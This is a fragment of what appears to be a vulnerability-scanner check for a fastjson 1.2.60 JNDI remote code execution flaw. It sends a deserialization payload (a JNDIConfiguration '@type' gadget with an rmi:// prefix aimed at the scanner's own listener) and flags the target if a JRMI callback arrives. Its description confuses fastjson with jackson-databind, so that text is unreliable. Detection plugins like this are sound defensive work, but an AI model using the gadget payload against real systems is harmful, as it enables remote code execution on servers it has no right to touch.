...
if (description)
{
  script_id(51799254);
  script_version("1.3");
  script_name(english:"fastjson 1.2.60 RCE");
  script_summary(english:"fastjson 1.2.60 RCE");
  script_set_attribute(attribute:"description", value:"FasterXML jackson-databind 1.2.60 mishandles the interaction between serialization gadgets and typing, related tocom.sun.rowset.JdbcRowSetImpl.");
...
function check_local_ping(port){
	...
	var postdata = '{"@type":"org.apache.commons.configuration.JNDIConfiguration","prefix":"rmi://'+ laddress +':'+ bind_port +'/Exploit"}';
    ...
    if ("JRMI" >< curl_response && "K" >< curl_response){
	    return {'vuln':true, 'report':"fastjson< 1.2.60 JNDI RCE"};
	} 
